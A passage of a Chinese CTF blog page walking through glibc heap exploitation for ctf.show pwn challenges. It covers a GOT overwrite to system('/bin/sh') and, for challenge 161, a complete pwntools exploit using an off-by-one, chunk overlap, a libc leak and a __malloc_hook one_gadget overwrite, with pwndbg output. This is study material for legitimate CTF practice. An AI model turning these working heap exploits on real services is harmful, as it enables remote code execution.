# 链入 fastbin</span><br><span class="line">+----------------------+ &lt;-- 0x8ee0108</span><br><span class="line">| 主chunk1 (伪造头)    |  # 被覆盖 size/FD 改掉</span><br><span class="line">| fd=free_got           |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee01a0</span><br><span class="line">| 系统chunk1 (0x80)    |  # header 被覆盖</span><br><span class="line">| ...                  |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee0228</span><br><span class="line">| 主chunk2 (0x80)      |  # 还在原位</span><br><span class="line">| 数据区: 0x8ee0230     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee02b0</span><br><span class="line">| 系统chunk2 (0x80)    |  # /bin/sh</span><br><span class="line">| 数据区: 0x8ee02b8     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee0400</span><br><span class="line">| 系统chunk3 (0x100)   |  # 远端 TOP 分配</span><br><span class="line">| 数据区: 0x8ee0408     |</span><br><span class="line">+----------------------+</span><br><span class="line">| TOP CHUNK            |</span><br><span class="line">高地址 ↑</span><br></pre></td></tr></table></figure>

<p>step 5：<code>show(1)</code> → 泄露 free@libc</p>
<ul>
<li>因为 fake FD 指向 <code>free_got</code>，show(1) 会打印出 GOT 表项内容（真实的 <code>free</code> 地址）。</li>
<li>通过 <code>free_addr - libc.sym[&#39;free&#39;]</code> 算出 libc 基址。</li>
</ul>
<p>Step 6：<code>edit(1,0x8,p32(system_addr))</code></p>
<ul>
<li>把 <code>free@got</code> 覆写成 <code>system</code>。</li>
</ul>
<p>Step 7：<code>free(2)</code></p>
<ul>
<li>系统chunk2 数据区存的是 <code>/bin/sh</code>；</li>
<li>执行 <code>free(2)</code> 实际调用了 <code>system(&quot;/bin/sh&quot;)</code> → getshell 🎉</li>
</ul>
<h2 id="161"><a href="#161" class="headerlink" title="161"></a>161</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_E3A</span><span class="params">(<span class="type">int</span> a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; (<span class="type">int</span>)a2 )</span><br><span class="line">    <span class="keyword">return</span> a2;</span><br><span class="line">  <span class="keyword">if</span> ( a2 - a1 == <span class="number">10</span> )</span><br><span class="line">    LODWORD(result) = a1 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    LODWORD(result) = a1;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在edit函数中有off-by-one漏洞</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level=&#x27;debug&#x27;,arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28311</span>)</span><br><span class="line"><span class="comment">#io = process(pwnfile)</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :io.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims		    :io.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">lg      = <span class="keyword">lambda</span> address,data       :log.success(<span class="string">&#x27;%s: &#x27;</span>%(address)+<span class="built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line">gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">	sla(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">	sla(<span class="string">b&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,data</span>):</span><br><span class="line">	sla(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">	ru(<span class="string">b&quot;index: &quot;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(idx))</span><br><span class="line">	ru(<span class="string">b&quot;size: &quot;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(size))</span><br><span class="line">	ru(<span class="string">b&quot;content: &quot;</span>)</span><br><span class="line">	s(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">	sla(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">	sla(<span class="string">b&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	sla(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">	sla(<span class="string">b&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span>+<span class="string">b&quot;\xe1&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>+<span class="number">10</span>,payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">main_arena = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">malloc_hook = main_arena-<span class="number">0x10</span>-<span class="number">88</span></span><br><span class="line">libc_base = malloc_hook-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">fake_chunk = malloc_hook-<span class="number">0x23</span></span><br><span class="line">realloc = libc_base+libc.sym[<span class="string">&quot;realloc&quot;</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base+gadget[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">0xd</span>+p64(<span class="number">0x71</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">0xd</span>+p64(<span class="number">0x71</span>)+p64(fake_chunk)</span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">3</span>+p64(<span class="number">0</span>)+p64(one_gadget)+p64(realloc+<span class="number">16</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<p>详细来解释攻击过程</p>
<ol>
<li></li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#3</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x60bcb54f7000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x60bcb54f7290</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)                 chunk0</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x60bcb54f72b0                               chunk1</span><br><span class="line">Size: 0x70 (with flag bits: 0x71)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x60bcb54f7320                               chunk2</span><br><span class="line">Size: 0x70 (with flag bits: 0x71)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x60bcb54f7390                               chunk3</span><br><span class="line">Size: 0x70 (with flag bits: 0x71)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x60bcb54f7400</span><br><span class="line">Size: 0x20c00 (with flag bits: 0x20c01)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----------------------+ &lt;-- A (index 0)</span><br><span class="line">| chunk A (0x70)       |  # 用来 off-by-one</span><br><span class="line">+----------------------+ &lt;-- B (index 1)</span><br><span class="line">| chunk B (0x70)       |  # 将被改 size=0xe0</span><br><span class="line">+----------------------+ &lt;-- C (index 2)</span><br><span class="line">| chunk C (0x70)       |  # 后面泄露 libc</span><br><span class="line">+----------------------+ &lt;-- D (index 3)</span><br><span class="line">| chunk D (0x70)       |  # 隔离，防合并</span><br><span class="line">+----------------------+</span><br><span class="line">| top chunk ...        |</span><br></pre></td></tr></table></figure>

<ol start="2">
<li></li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span>+<span class="string">b&quot;\xe1&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>+<span class="number">10</span>,payload)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x63ea93c93000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x63ea93c93290</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)               chunk0</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x63ea93c932b0</span><br><span class="line">Size: 0xe0 (with flag bits: 0xe1)                chunk1的大小就被改了</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x63ea93c93390                             chunk3</span><br><span class="line">Size: 0x70 (with flag bits: 0x71)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x63ea93c93400</span><br><span class="line">Size: 0x20c00 (with flag bits: 0x20c01)</span><br></pre></td></tr></table></figure>

<p>可以看到chunk1的大小就被改了</p>
<p>怎么改变的呢？</p>
<p>0x18会自动补全成0x20此时覆盖掉了pre size,由于off-by-one,我们写入0xe1就可以覆盖chunk1的size从而改变chunk1的大小。</p>
<p>这样做有什么用？</p>
<p>chunk1大小改变后chunk1的用户区就会覆盖到chunk2的头部。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>)  <span class="comment">#free(B) → B(0xe0) 进 unsorted，fd/bk 写入 libc 地址</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x6271fdbd2000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x6271fdbd2290</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x6271fdbd22b0</span><br><span class="line">Size: 0xe0 (with flag bits: 0xe1)</span><br><span class="line">fd: 0x6271fdbd2</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x6271fdbd2390</span><br><span class="line">Size: 0x70 (with flag bits: 0x71)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x6271fdbd2400</span><br><span class="line">Size: 0x20c00 (with flag bits: 0x20c01)</span><br></pre></td></tr></table></figure>

<p>这里补充一下</p>
<ul>
<li><strong>glibc 的 free 逻辑</strong>（以 2.23 为例）：<ul>
<li>小于等于 <code>0x80</code>（含 chunk header）的空闲块 → 放入 <strong>fastbin</strong>；</li>
<li>大于 <code>0x80</code> 且小于等于 <code>0x400</code> → 放入 <strong>small bin</strong>，但第一次 free 先进入 <strong>unsorted bin</strong>；</li>
<li>更大的 → large bin &#x2F; top chunk。</li>
</ul>
</li>
</ul>
<p>👉 总结：<strong>一个 chunk 进 unsorted 还是 fastbin，取决于它的 size（含 header）</strong></p>
<p>这样做有什么用？</p>
<p>由上一步chunk1的用户区覆盖到chunk2的头部，当 chunk1 进 unsorted 时，glibc 会在这个空闲块的用户区最前面写入 <code>fd/bk</code> 指针，指向 <code>main_arena</code>，<strong>这些指针是 libc 地址</strong>。</p>
<p>由于 chunk1 被“扩成了 0xe0”，它的“用户区”已经<strong>覆盖到 chunk2的头和部分用户区</strong>；于是 <strong>unsorted 的 <code>fd/bk</code> 指针就落在了 C 的用户区</strong>里（<strong>重叠泄露</strong>的关键）</p>
<p>这时 <code>add(0x88)</code> <code>show(2)</code> 将chunk1申请回来再，打印 chunk2，就能读到 <code>main_arena</code> 相关指针，从而泄露 libc。</p>
<p>远程是可以泄露的，但是在本地调试的时候add(0x88)的时候会回直接申请一个新堆块，导致没成功，现在还没找到解决办法，先放这里。</p>
<h2 id="162"><a href="#162" class="headerlink" title="162"></a>162</h2>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="linkpwn"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">linkpwn</p>
  <div class="site-description" itemprop="description">linkpwn的学习经历</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">74</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">43</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/linkpwn" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;linkpwn" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:dkj20060328@qq.com" title="E-Mail → mailto:dkj20060328@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://weibo.com/linkpwn" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;linkpwn" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
          <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1827600686&auto=1&height=66"></iframe>
    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">linkpwn</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>

<!--单击显示文字-->
<script type="text/javascript" src="/js/clickshowtext.js"></script>

<!-- 页面点击小红心 -->
<script type="text/javascript" src="/js/clicklove.js"></script>

<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
<script type="text/javascript" src="/js/fireworks.js"></script>
